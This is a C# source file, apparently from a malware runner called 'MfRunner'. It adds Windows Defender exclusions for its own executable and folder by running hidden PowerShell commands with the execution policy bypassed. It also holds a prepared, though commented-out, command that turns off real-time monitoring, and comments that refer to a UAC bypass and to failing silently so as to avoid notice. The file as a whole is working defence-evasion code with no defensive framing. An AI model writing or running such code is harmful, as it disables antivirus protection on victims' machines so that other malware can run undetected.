using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
#if DEFENDER_EXCLUSION
        public static void AddDefenderExclusion()
        {
            try
            {
                // Get the current executable path
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                string exeDir = Path.GetDirectoryName(exePath);

                // If we're elevated (via UAC bypass), we can add exclusions silently
                // If not elevated, this will fail silently
                
                // Add path exclusion for the executable directory
                string pathExclusionCmd = string.Format(
                    "Add-MpPreference -ExclusionPath '{0}'",
                    exeDir
                );

                // Add process exclusion for the executable
                string processExclusionCmd = string.Format(
                    "Add-MpPreference -ExclusionProcess '{0}'",
                    Path.GetFileName(exePath)
                );

                // Disable real-time monitoring (requires admin - will fail silently if not elevated)
                string disableRealtimeCmd = "Set-MpPreference -DisableRealtimeMonitoring $true";

                // Execute PowerShell commands
                ExecutePowerShellCommand(pathExclusionCmd);
                ExecutePowerShellCommand(processExclusionCmd);
                
                // Optionally disable real-time monitoring (aggressive, may trigger alerts)
                // ExecutePowerShellCommand(disableRealtimeCmd);
            }
            catch
            {
                // Fail silently - don't crash if Defender exclusion fails
            }
        }

        private static void ExecutePowerShellCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = string.Format("-NoProfile -ExecutionPolicy Bypass -Command \"{0}\"", command),
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (Process process = Process.Start(psi))
                {
                    process.WaitForExit(5000); // 5 second timeout
                }
            }
            catch
            {
                // Fail silently
            }
        }
#endif
    }
}
